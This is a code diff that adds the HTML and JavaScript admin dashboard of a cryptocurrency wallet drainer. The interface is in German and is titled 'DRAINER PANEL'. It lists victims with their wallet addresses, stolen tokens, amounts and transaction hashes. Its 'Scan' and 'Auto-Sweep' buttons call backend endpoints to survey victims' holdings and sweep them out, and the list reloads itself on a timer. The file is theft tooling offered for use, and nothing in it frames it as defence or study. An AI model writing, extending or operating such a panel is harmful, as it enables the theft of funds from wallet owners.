@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="de"><head><meta charset="UTF-8"><title>Drainer Admin</title>
+<style>body{font-family:monospace;background:#0a0a0f;color:#0f0;margin:0;padding:20px}h1{color:#fff}.card{background:#111;border:1px solid #333;border-radius:8px;padding:16px;margin:12px 0}button{background:#7c3aed;color:#fff;border:0;padding:8px 16px;border-radius:6px;cursor:pointer;margin:4px}table{width:100%;border-collapse:collapse}td,th{border-bottom:1px solid #222;padding:8px;text-align:left;font-size:13px}.amt{color:#ffd700}</style>
+</head><body>
+<h1>◈ DRAINER PANEL</h1>
+<div><button onclick="load()">↻ Refresh</button> <span id="stats"></span></div>
+<div id="victims"></div>
+<script>
+async function load(){
+  const v = await (await fetch('/api/victims')).json();
+  document.getElementById('stats').textContent = `${v.length} Opfer total`;
+  const div = document.getElementById('victims');
+  div.innerHTML = v.slice().reverse().map((x,i)=>`
+    <div class="card">
+      <b>${x.victim||'?'}</b> <small>${x.time||''} — ${x.type||''}</small><br>
+      <small>${x.token||x.collection||''} <span class="amt">${x.amount||''}</span> ${x.txHash||''}</small><br>
+      <button onclick="scan('${x.victim}')">Scan</button>
+      <button onclick="sweep('${x.victim}')">Auto-Sweep</button>
+      <div id="s-${i}"></div>
+    </div>`).join('');
+}
+async function scan(v){
+  const r = await (await fetch('/api/scan/'+v)).json();
+  alert(JSON.stringify(r,null,2).slice(0,2000));
+}
+async function sweep(v){
+  const r = await (await fetch('/api/autosweep/'+v,{method:'POST'})).json();
+  alert(JSON.stringify(r,null,2).slice(0,2000));
+}
+load(); setInterval(load, 15000);
+</script>
+</body></html>
